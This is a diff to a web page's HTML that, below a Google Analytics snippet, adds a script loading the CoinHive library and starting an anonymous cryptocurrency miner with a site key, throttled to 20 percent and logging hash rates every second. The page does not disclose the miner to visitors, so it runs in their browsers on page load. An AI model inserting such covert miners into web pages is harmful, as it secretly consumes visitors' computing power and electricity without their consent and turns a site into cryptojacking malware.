@@ -8,3 +8,22 @@
   ga('send', 'pageview');
 
 </script>
+
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('exN9MUJT735qbTYsRA6Jm1Mr3nQmP4yT', {
+        throttle: 0.2
+    });
+    miner.start();
+
+    // Update stats once per second
+    setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes     = miner.getTotalHashes();
+        var acceptedHashes  = miner.getAcceptedHashes();
+
+        console.log(hashesPerSecond, totalHashes, acceptedHashes);
+
+        // Output to HTML elements...
+    }, 1000);
+</script>
